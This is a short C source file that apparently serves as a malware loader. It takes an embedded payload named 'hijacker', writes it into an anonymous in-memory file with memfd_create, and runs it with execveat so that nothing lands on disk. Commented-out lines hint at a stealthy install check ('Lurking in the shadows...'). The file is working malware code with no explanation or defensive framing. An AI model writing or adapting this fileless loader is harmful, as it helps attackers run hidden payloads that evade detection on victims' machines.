#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/syscall.h>
#include "../utils/utils.c"

int is_installed() {
    FILE *fp = fopen(CHECK_IF_INSTALLED, "r");
    if (fp == NULL) {
        FILE *fp = fopen(CHECK_IF_INSTALLED, "w");
        fclose(fp);
        return 0;
    }
    return 1;
}

int main() {
    // log_info("Lurking in the shadows...\n");
    // if (is_installed()) {
    //     // log_info("Already installed\n");
    //     return 0;
    // }
    char *binary = get_binary("hijacker");
    unsigned long aux = 0;
    
    // log_info("Debug mode\n");


    int fd = memfd_create("a", FD_CLOEXEC);
    write(fd, binary + 8, (unsigned char)binary[0] | ((unsigned char)binary[1] << 8));
    execveat(fd, "", &aux, NULL, 0x1000);

    return 0;
}
